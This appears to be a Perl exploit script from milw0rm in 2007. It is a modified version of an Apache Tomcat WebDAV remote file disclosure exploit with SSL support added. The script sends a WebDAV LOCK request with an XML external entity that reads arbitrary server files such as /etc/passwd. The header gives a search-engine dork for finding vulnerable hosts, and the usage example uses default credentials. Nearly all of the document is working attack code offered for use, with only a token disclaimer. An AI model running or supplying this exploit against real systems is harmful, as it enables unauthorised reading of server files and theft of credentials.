#!/usr/bin/perl
#================================================================
# Apache Tomcat Remote File Disclosure Zeroday Xploit - With support for SSL
# MoDiFiEd version by  : h3rcul3s 
# ORiGiNaL Version by  : kcdarookie aka eliteb0y / 2007  http://milw0rm.org/exploits/4530
# MoDiFiCaTiOn	       : This code is useble against targets over SSL
# Prerequisites        : A valid login credentials, webdav 
# DoRk                 : intitle:"Directory Listing For /" + inurl:webdav tomcat 
# Potential targets    : similar to https://www.somehost.com:8443
#================================================================
# THaNkS To eliteb0y, the whole team AnD "perlmonks".
# This piece of code is written ONLY for educational purpose. 
# Use it at your own risk. 
# No author will be responsible for any damage.
#================================================================
# -------------------------[C O D E]-----------------------------
#================================================================
use LWP::Protocol::https;
use IO::Socket;
use MIME::Base64; ### FIXME! Maybe support other auths too ?

# SET REMOTE PORT HERE--------------------------------------------
$remoteport = 8443;

sub usage {
       print "\nApache Tomcat Remote File Disclosure Zeroday Xploit\n";
       print "\n\n";
       print "Basic exploit by      : kcdarookie aka eliteb0y / 2007\n";
       print "SSL Support added by  : .o0|h 3 r c u l 3 s|0o. \n";
       print "\n\n";
       print "USAGE  :\nperl  TOMCATXPL-SSL <remotehost> <webdav file> <file to retrieve> [username] [password] [https]\n";
       print "\nExample:\nperl TOMCATXPL-SSL www.hostname.com /webdav /etc/passwd tomcat tomcat https\n\n";exit;
           }

if ($#ARGV < 2) {usage();}

$hostname = $ARGV[0];
$webdavfile = $ARGV[1];
$remotefile = $ARGV[2];
$username = $ARGV[3];
$password = $ARGV[4];

my $sock = LWP::Protocol::https::Socket->new(PeerAddr => $hostname,
					PeerPort => $remoteport,
                     			Proto    => 'tcp');
$|=1;

$BasicAuth = encode_base64("$username:$password");

$KRADXmL =
"<?xml version=\"1.0\"?>\n"
."<!DOCTYPE REMOTE [\n"
."<!ENTITY RemoteX SYSTEM \"$remotefile\">\n"
."]>\n"
."<D:lockinfo xmlns:D='DAV:'>\n"
."<D:lockscope><D:exclusive/></D:lockscope>\n"
."<D:locktype><D:write/></D:locktype>\n"
."<D:owner>\n"
."<D:href>\n"
."<REMOTE>\n"
."<RemoteX>&RemoteX;</RemoteX>\n"
."</REMOTE>\n"
."</D:href>\n"
."</D:owner>\n"
."</D:lockinfo>\n";

print "\nApache Tomcat Remote File Disclosure Zeroday Eploit-SSL verssion\n";
print "\n";
print "Launching Remote Exploit over SSL...\n";

$ExploitRequest =
 "LOCK $webdavfile HTTP/1.1\r\n"
."Host: $hostname\r\n";

if ($username ne "") {
$ExploitRequest .= "Authorization: Basic $BasicAuth\r\n";
}
$ExploitRequest .= "Content-Type: text/xml\r\nContent-Length: ".length($KRADXmL)."\r\n\r\n" . $KRADXmL;

print $sock $ExploitRequest;

while(<$sock>) {
       print;
}

# milw0rm.com [2007-10-21]
